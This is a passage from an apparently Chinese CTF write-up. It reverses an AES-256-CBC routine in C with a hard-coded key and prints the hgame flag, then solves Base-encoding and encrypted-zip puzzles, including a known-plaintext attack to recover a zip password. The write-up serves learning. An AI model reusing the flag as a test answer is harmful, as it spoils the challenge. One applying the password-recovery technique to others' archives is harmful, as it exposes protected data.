src="https://i.loli.net/2021/02/27/p7NOiGZoXHwMrKW.png" alt="image-20210223230432003"></p><p>找到加密的地方，开始静态看了一下整个加密流程，只是注意到很多异或运算也不复杂，在一个置位的地方发现加密后的一个aes的s-box。</p><p>确定aes加密后，又进而发现是带有iv的。</p><p><img src="https://i.loli.net/2021/02/27/cpix3L91BESXuGe.png" alt="image-20210223231923153"></p><p>再梳理了一下这里的加密流程：</p><p><img src="https://i.loli.net/2021/02/27/WRM9vQi1HZD8O7e.png" alt="image-20210223233754450"></p><p>可以从重复轮进行了13次可以知道key是256位的，但块长度是128位的。。之前一直以为密钥长度和块长度是一样的。又加上这里移位和混合的方向和我之前了解的正好相反，就感觉是魔改过的aes加密，开始用C自己写逆过程，关键就是行混合不好写，还好有搜索，hh。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> rsbox[<span class="number">256</span>] = &#123;</span><br><span class="line">  <span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6a</span>, <span class="number">0xd5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xa5</span>, <span class="number">0x38</span>, <span class="number">0xbf</span>, <span class="number">0x40</span>, <span class="number">0xa3</span>, <span class="number">0x9e</span>, <span class="number">0x81</span>, <span class="number">0xf3</span>, <span class="number">0xd7</span>, <span class="number">0xfb</span>,</span><br><span class="line">  <span class="number">0x7c</span>, <span class="number">0xe3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x9b</span>, <span class="number">0x2f</span>, <span class="number">0xff</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8e</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xc4</span>, <span class="number">0xde</span>, <span class="number">0xe9</span>, <span class="number">0xcb</span>,</span><br><span class="line">  <span class="number">0x54</span>, <span class="number">0x7b</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xa6</span>, <span class="number">0xc2</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0xee</span>, <span class="number">0x4c</span>, <span class="number">0x95</span>, <span class="number">0x0b</span>, <span class="number">0x42</span>, <span class="number">0xfa</span>, <span class="number">0xc3</span>, <span class="number">0x4e</span>,</span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x2e</span>, <span class="number">0xa1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xd9</span>, <span class="number">0x24</span>, <span class="number">0xb2</span>, <span class="number">0x76</span>, <span class="number">0x5b</span>, <span class="number">0xa2</span>, <span class="number">0x49</span>, <span class="number">0x6d</span>, <span class="number">0x8b</span>, <span class="number">0xd1</span>, <span class="number">0x25</span>,</span><br><span class="line">  <span class="number">0x72</span>, <span class="number">0xf8</span>, <span class="number">0xf6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>, <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xd4</span>, <span class="number">0xa4</span>, <span class="number">0x5c</span>, <span class="number">0xcc</span>, <span class="number">0x5d</span>, <span class="number">0x65</span>, <span class="number">0xb6</span>, <span class="number">0x92</span>,</span><br><span class="line">  <span class="number">0x6c</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xfd</span>, <span class="number">0xed</span>, <span class="number">0xb9</span>, <span class="number">0xda</span>, <span class="number">0x5e</span>, <span class="number">0x15</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xa7</span>, <span class="number">0x8d</span>, <span class="number">0x9d</span>, <span class="number">0x84</span>,</span><br><span class="line">  <span class="number">0x90</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x00</span>, <span class="number">0x8c</span>, <span class="number">0xbc</span>, <span class="number">0xd3</span>, <span class="number">0x0a</span>, <span class="number">0xf7</span>, <span class="number">0xe4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0xb3</span>, <span class="number">0x45</span>, <span class="number">0x06</span>,</span><br><span class="line">  <span class="number">0xd0</span>, <span class="number">0x2c</span>, <span class="number">0x1e</span>, <span class="number">0x8f</span>, <span class="number">0xca</span>, <span class="number">0x3f</span>, <span class="number">0x0f</span>, <span class="number">0x02</span>, <span class="number">0xc1</span>, <span class="number">0xaf</span>, <span class="number">0xbd</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8a</span>, <span class="number">0x6b</span>,</span><br><span class="line">  <span class="number">0x3a</span>, <span class="number">0x91</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4f</span>, <span class="number">0x67</span>, <span class="number">0xdc</span>, <span class="number">0xea</span>, <span class="number">0x97</span>, <span class="number">0xf2</span>, <span class="number">0xcf</span>, <span class="number">0xce</span>, <span class="number">0xf0</span>, <span class="number">0xb4</span>, <span class="number">0xe6</span>, <span class="number">0x73</span>,</span><br><span class="line">  <span class="number">0x96</span>, <span class="number">0xac</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xe7</span>, <span class="number">0xad</span>, <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xe2</span>, <span class="number">0xf9</span>, <span class="number">0x37</span>, <span class="number">0xe8</span>, <span class="number">0x1c</span>, <span class="number">0x75</span>, <span class="number">0xdf</span>, <span class="number">0x6e</span>,</span><br><span class="line">  <span class="number">0x47</span>, <span class="number">0xf1</span>, <span class="number">0x1a</span>, <span class="number">0x71</span>, <span class="number">0x1d</span>, <span class="number">0x29</span>, <span class="number">0xc5</span>, <span class="number">0x89</span>, <span class="number">0x6f</span>, <span class="number">0xb7</span>, <span class="number">0x62</span>, <span class="number">0x0e</span>, <span class="number">0xaa</span>, <span class="number">0x18</span>, <span class="number">0xbe</span>, <span class="number">0x1b</span>,</span><br><span class="line">  <span class="number">0xfc</span>, <span class="number">0x56</span>, <span class="number">0x3e</span>, <span class="number">0x4b</span>, <span class="number">0xc6</span>, <span class="number">0xd2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9a</span>, <span class="number">0xdb</span>, <span class="number">0xc0</span>, <span class="number">0xfe</span>, <span class="number">0x78</span>, <span class="number">0xcd</span>, <span class="number">0x5a</span>, <span class="number">0xf4</span>,</span><br><span class="line">  <span class="number">0x1f</span>, <span class="number">0xdd</span>, <span class="number">0xa8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xc7</span>, <span class="number">0x31</span>, <span class="number">0xb1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>,</span><br><span class="line">  <span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x7f</span>, <span class="number">0xa9</span>, <span class="number">0x19</span>, <span class="number">0xb5</span>, <span class="number">0x4a</span>, <span class="number">0x0d</span>, <span class="number">0x2d</span>, <span class="number">0xe5</span>, <span class="number">0x7a</span>, <span class="number">0x9f</span>, <span class="number">0x93</span>, <span class="number">0xc9</span>, <span class="number">0x9c</span>, <span class="number">0xef</span>,</span><br><span class="line">  <span class="number">0xa0</span>, <span class="number">0xe0</span>, <span class="number">0x3b</span>, <span class="number">0x4d</span>, <span class="number">0xae</span>, <span class="number">0x2a</span>, <span class="number">0xf5</span>, <span class="number">0xb0</span>, <span class="number">0xc8</span>, <span class="number">0xeb</span>, <span class="number">0xbb</span>, <span class="number">0x3c</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>,</span><br><span class="line">  <span class="number">0x17</span>, <span class="number">0x2b</span>, <span class="number">0x04</span>, <span class="number">0x7e</span>, <span class="number">0xba</span>, <span class="number">0x77</span>, <span class="number">0xd6</span>, <span class="number">0x26</span>, <span class="number">0xe1</span>, <span class="number">0x69</span>, <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0c</span>, <span class="number">0x7d</span> &#125;;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[] = &#123;<span class="number">0x43</span>, <span class="number">0x72</span>, <span class="number">0x79</span>, <span class="number">0x70</span>, <span class="number">0x74</span>, <span class="number">0x6f</span>, <span class="number">0x46</span>, <span class="number">0x41</span>, <span class="number">0x49</span>, <span class="number">0x4c</span>, <span class="number">0x55</span>, <span class="number">0x52</span>, <span class="number">0x45</span>, <span class="number">0x66</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x41</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x34</span>, <span class="number">0x38</span>, <span class="number">0x4b</span>, <span class="number">0x65</span>, <span class="number">0x79</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0xbf</span>, <span class="number">0x8f</span>, <span class="number">0x84</span>, <span class="number">0x8d</span>, <span class="number">0xcb</span>, <span class="number">0xe0</span>, <span class="number">0xc2</span>, <span class="number">0xcc</span>, <span class="number">0x82</span>, <span class="number">0xac</span>, <span class="number">0x97</span>, <span class="number">0x9e</span>, <span class="number">0xc7</span>, <span class="number">0xca</span>, <span class="number">0xf8</span>, <span class="number">0xec</span>, <span class="number">0x94</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0xfc</span>, <span class="number">0xa4</span>, <span class="number">0x13</span>, <span class="number">0x38</span>, <span class="number">0xb7</span>, <span class="number">0xc1</span>, <span class="number">0x6a</span>, <span class="number">0x19</span>, <span class="number">0x96</span>, <span class="number">0xe0</span>, <span class="number">0x4b</span>, <span class="number">0x38</span>, <span class="number">0xb7</span>, <span class="number">0x0e</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>, <span class="number">0x6c</span>, <span class="number">0xc5</span>, <span class="number">0x68</span>, <span class="number">0xef</span>, <span class="number">0xa0</span>, <span class="number">0x47</span>, <span class="number">0xc4</span>, <span class="number">0x78</span>, <span class="number">0x3e</span>, <span class="number">0x80</span>, <span class="number">0x0e</span>, <span class="number">0x80</span>, <span class="number">0xd2</span>, <span class="number">0x59</span>, <span class="number">0x8c</span>, <span class="number">0xcd</span>, <span class="number">0x49</span>, <span class="number">0xfd</span>, <span class="number">0x9f</span>, <span class="number">0xf5</span>, <span class="number">0xfe</span>, <span class="number">0x3c</span>, <span class="number">0xf5</span>, <span class="number">0xec</span>, <span class="number">0x68</span>, <span class="number">0xdc</span>, <span class="number">0xbe</span>, <span class="number">0xd4</span>, <span class="number">0xdf</span>, <span class="number">0xa4</span>, <span class="number">0xc0</span>, <span class="number">0xb3</span>, <span class="number">0xea</span>, <span class="number">0x61</span>, <span class="number">0xa8</span>, <span class="number">0x5c</span>, <span class="number">0x4a</span>, <span class="number">0x26</span>, <span class="number">0x6c</span>, <span class="number">0x24</span>, <span class="number">0x74</span>, <span class="number">0xa6</span>, <span class="number">0x62</span>, <span class="number">0xa4</span>, <span class="number">0xa6</span>, <span class="number">0x7d</span>, <span class="number">0x26</span>, <span class="number">0x84</span>, <span class="number">0x6d</span>, <span class="number">0x80</span>, <span class="number">0xb9</span>, <span class="number">0x71</span>, <span class="number">0x93</span>, <span class="number">0xbc</span>, <span class="number">0x4c</span>, <span class="number">0x9d</span>, <span class="number">0xfb</span>, <span class="number">0x60</span>, <span class="number">0xf2</span>, <span class="number">0x49</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0xfb</span>, <span class="number">0x85</span>, <span class="number">0x3a</span>, <span class="number">0x44</span>, <span class="number">0x53</span>, <span class="number">0xd9</span>, <span class="number">0x70</span>, <span class="number">0x62</span>, <span class="number">0x3f</span>, <span class="number">0xfd</span>, <span class="number">0x04</span>, <span class="number">0xc4</span>, <span class="number">0x5d</span>, <span class="number">0x59</span>, <span class="number">0xa2</span>, <span class="number">0x61</span>, <span class="number">0x6a</span>, <span class="number">0x4f</span>, <span class="number">0x57</span>, <span class="number">0xe1</span>, <span class="number">0xd3</span>, <span class="number">0x3e</span>, <span class="number">0xc4</span>, <span class="number">0x5d</span>, <span class="number">0x9f</span>, <span class="number">0xa3</span>, <span class="number">0x3f</span>, <span class="number">0x3d</span>, <span class="number">0x6d</span>, <span class="number">0xea</span>, <span class="number">0x1b</span>, <span class="number">0x09</span>, <span class="number">0x7c</span>, <span class="number">0x2a</span>, <span class="number">0x1d</span>, <span class="number">0x4d</span>, <span class="number">0x2f</span>, <span class="number">0xf3</span>, <span class="number">0x6d</span>, <span class="number">0x2f</span>, <span class="number">0x10</span>, <span class="number">0x0e</span>, <span class="number">0x69</span>, <span class="number">0xeb</span>, <span class="number">0x4d</span>, <span class="number">0x57</span>, <span class="number">0xcb</span>, <span class="number">0x88</span>, <span class="number">0x89</span>, <span class="number">0x14</span>, <span class="number">0x48</span>, <span class="number">0x69</span>, <span class="number">0x5a</span>, <span class="number">0x2a</span>, <span class="number">0x8c</span>, <span class="number">0x34</span>, <span class="number">0xc5</span>, <span class="number">0x89</span>, <span class="number">0xb3</span>, <span class="number">0x09</span>, <span class="number">0xa8</span>, <span class="number">0x63</span>, <span class="number">0xa8</span>, <span class="number">0xeb</span>, <span class="number">0x87</span>, <span class="number">0xe8</span>, <span class="number">0x1c</span>, <span class="number">0xa6</span>, <span class="number">0xa8</span>, <span class="number">0x1b</span>, <span class="number">0x71</span>, <span class="number">0x89</span>, <span class="number">0xb8</span>, <span class="number">0x15</span>, <span class="number">0x18</span>, <span class="number">0x62</span>, <span class="number">0xf5</span>, <span class="number">0x42</span>, <span class="number">0xd3</span>, <span class="number">0x22</span>, <span class="number">0x6f</span>, <span class="number">0x38</span>, <span class="number">0x2e</span>, <span class="number">0x4b</span>, <span class="number">0x35</span>, <span class="number">0x12</span>, <span class="number">0xa2</span>, <span class="number">0x7f</span>, <span class="number">0xf0</span>, <span class="number">0x9b</span>, <span class="number">0x11</span>, <span class="number">0x76</span>, <span class="number">0x58</span>, <span class="number">0xf8</span>, <span class="number">0xb9</span>, <span class="number">0xc1</span>, <span class="number">0xc6</span>, <span class="number">0xbe</span>, <span class="number">0x24</span>, <span class="number">0x67</span>, <span class="number">0x6e</span>, <span class="number">0xa5</span>, <span class="number">0x55</span>, <span class="number">0xee</span>, <span class="number">0xd6</span>, <span class="number">0xb0</span>, <span class="number">0x4d</span>, <span class="number">0x8c</span>, <span class="number">0x23</span>, <span class="number">0xf2</span>, <span class="number">0x9e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0a</span>, <span class="number">0x0b</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x0f</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">xtime</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((x&lt;&lt;<span class="number">1</span>) ^ (((x&gt;&gt;<span class="number">7</span>) &amp; <span class="number">1</span>) * <span class="number">0x1b</span>))&amp;<span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">Multiply</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> x, <span class="keyword">unsigned</span> <span class="keyword">char</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (((y &amp; <span class="number">1</span>) * x) ^</span><br><span class="line">       ((y&gt;&gt;<span class="number">1</span> &amp; <span class="number">1</span>) * xtime(x)) ^</span><br><span class="line">       ((y&gt;&gt;<span class="number">2</span> &amp; <span class="number">1</span>) * xtime(xtime(x))) ^</span><br><span class="line">       ((y&gt;&gt;<span class="number">3</span> &amp; <span class="number">1</span>) * xtime(xtime(xtime(x)))) ^</span><br><span class="line">       ((y&gt;&gt;<span class="number">4</span> &amp; <span class="number">1</span>) * xtime(xtime(xtime(xtime(x)))))); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InvMixColumns</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> a, b, c, d;</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123; </span><br><span class="line">    a = state[<span class="number">4</span>*i];</span><br><span class="line">    b = state[<span class="number">4</span>*i+<span class="number">1</span>];</span><br><span class="line">    c = state[<span class="number">4</span>*i+<span class="number">2</span>];</span><br><span class="line">    d = state[<span class="number">4</span>*i+<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    state[<span class="number">4</span>*i] = Multiply(a, <span class="number">0x0e</span>) ^ Multiply(b, <span class="number">0x0b</span>) ^ Multiply(c, <span class="number">0x0d</span>) ^ Multiply(d, <span class="number">0x09</span>);</span><br><span class="line">    state[<span class="number">4</span>*i+<span class="number">1</span>] = Multiply(a, <span class="number">0x09</span>) ^ Multiply(b, <span class="number">0x0e</span>) ^ Multiply(c, <span class="number">0x0b</span>) ^ Multiply(d, <span class="number">0x0d</span>);</span><br><span class="line">    state[<span class="number">4</span>*i+<span class="number">2</span>] = Multiply(a, <span class="number">0x0d</span>) ^ Multiply(b, <span class="number">0x09</span>) ^ Multiply(c, <span class="number">0x0e</span>) ^ Multiply(d, <span class="number">0x0b</span>);</span><br><span class="line">    state[<span class="number">4</span>*i+<span class="number">3</span>] = Multiply(a, <span class="number">0x0b</span>) ^ Multiply(b, <span class="number">0x0d</span>) ^ Multiply(c, <span class="number">0x09</span>) ^ Multiply(d, <span class="number">0x0e</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun_xor</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">unsigned</span> <span class="keyword">char</span> *enc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">enc[i] ^= key[k*<span class="number">16</span> + i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InvShift</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">1</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> s = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(s &lt; j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> tmp = a1[<span class="number">4</span>*<span class="number">3</span>+j];</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">3</span>; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">a1[<span class="number">4</span>*i+j] = a1[<span class="number">4</span>*(i<span class="number">-1</span>)+j];</span><br><span class="line">a1[j] = tmp;</span><br><span class="line">s++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InvSub</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">p[i] = rsbox[p[i]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[] = &#123;<span class="number">0x91</span>, <span class="number">0xb3</span>, <span class="number">0xc1</span>, <span class="number">0xeb</span>, <span class="number">0x14</span>, <span class="number">0x5d</span>, <span class="number">0xd5</span>, <span class="number">0xce</span>, <span class="number">0x3a</span>, <span class="number">0x1d</span>, <span class="number">0x30</span>, <span class="number">0xe4</span>, <span class="number">0x70</span>, <span class="number">0x6c</span>, <span class="number">0x6b</span>, <span class="number">0xd7</span>, <span class="number">0x69</span>, <span class="number">0x78</span>, <span class="number">0x79</span>, <span class="number">0x02</span>, <span class="number">0xa3</span>, <span class="number">0xa5</span>, <span class="number">0xdf</span>, <span class="number">0x1b</span>, <span class="number">0xfd</span>, <span class="number">0x1c</span>, <span class="number">0x02</span>, <span class="number">0x89</span>, <span class="number">0x14</span>, <span class="number">0x20</span>, <span class="number">0x7a</span>, <span class="number">0xfd</span>, <span class="number">0x24</span>, <span class="number">0x52</span>, <span class="number">0xf8</span>, <span class="number">0xa9</span>, <span class="number">0xf9</span>, <span class="number">0xf1</span>, <span class="number">0x6b</span>, <span class="number">0x1c</span>, <span class="number">0x0f</span>, <span class="number">0x5d</span>, <span class="number">0x50</span>, <span class="number">0x5b</span>, <span class="number">0xec</span>, <span class="number">0x42</span>, <span class="number">0xd1</span>, <span class="number">0x8c</span>, <span class="number">0xb8</span>, <span class="number">0x12</span>, <span class="number">0xcf</span>, <span class="number">0x2c</span>, <span class="number">0xa9</span>, <span class="number">0x69</span>, <span class="number">0x31</span>, <span class="number">0x46</span>, <span class="number">0xfd</span>, <span class="number">0x9b</span>, <span class="number">0xea</span>, <span class="number">0xde</span>, <span class="number">0xc8</span>, <span class="number">0xbf</span>, <span class="number">0x94</span>, <span class="number">0x69</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *p = a+<span class="number">48</span>, *p1;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> iv[] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">fun_xor(<span class="number">0xe</span>, p);</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">13</span>; ; j--)</span><br><span class="line">&#123;</span><br><span class="line">InvShift(p);</span><br><span class="line">InvSub(p);</span><br><span class="line">fun_xor(j, p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(j == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">InvMixColumns(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i != <span class="number">3</span>)</span><br><span class="line">p1 = p<span class="number">-16</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">p1 = iv;</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)</span><br><span class="line">&#123;</span><br><span class="line">p[k] ^= p1[k];</span><br><span class="line">&#125;</span><br><span class="line">p = p1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, a[i]);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//hgame&#123;cOsm0s_is_still_fight1ng_and_NEVER_GIVE_UP_O0o0o0oO00o00o&#125;</span></span><br></pre></td></tr></table></figure><p>其实写好逆过程后，开始一直解不来，后面一个一个排查再发现是密文找错了，<strong>再次被从ida的伪代码来看变量的值坑到</strong>。。。</p><p><strong>另外这个aes加密并没有魔改的，后面我又用python的aes模块解了一下，同样解出。。那现在问题就是移位和混合的方向的问题（这里先留一下），后面再好好学习一下。至于块长度和密钥长度是没关系的。</strong></p><p>最后就总结一下aes加密的大概：</p><blockquote><ol><li><strong>重复轮：128位密钥一般重复执行9次，192位密钥一般重复执行11次，256位密钥一般重复执行13次。</strong></li><li><strong>重复轮每轮重复的操作包括：字节替换、行移位、列混乱、轮密钥加。</strong></li><li><strong>在aes中块长度与都是128位，与密钥长度无关。</strong></li><li><strong>每执行一块的加密操作，开始是一个初始轮（与初始密钥异或），然后重复轮，最后一个最终轮（除开列混混合操作）。</strong></li></ol></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h3><p>从每一步骤后的字符组成可以容易辨认出来。</p><p>base64，base32，base16</p><h3 id="不起眼压缩包的养成的方法"><a href="#不起眼压缩包的养成的方法" class="headerlink" title="不起眼压缩包的养成的方法"></a>不起眼压缩包的养成的方法</h3><p>从图片最后看到一个压缩包和提示密码是图片id。</p><p><a href="https://saucenao.com/" target="_blank" rel="noopener">https://saucenao.com/</a> 上这个网站查该图片的id。</p><p>解压后得到plain.zip和NO PASSWORD.txt，而plain.zip又要密码，看了一下里面的文件，发现也有一个NO PASSWORD.txt文件，它们crc32值。</p><p>这由此想到应该是明文攻击了，而明文攻击有一个条件，2个文件的压缩方式要相同，这在NO PASSWORD.txt中有提示。</p><p><img src="https://i.loli.net/2021/02/27/GRqjEDtQSy2rYsb.png" alt="image-20210204222714426"></p><p>明文攻击得到密码：</p><p><img src="https://i.loli.net/2021/02/27/oYBRAm6M51IbNpl.png" 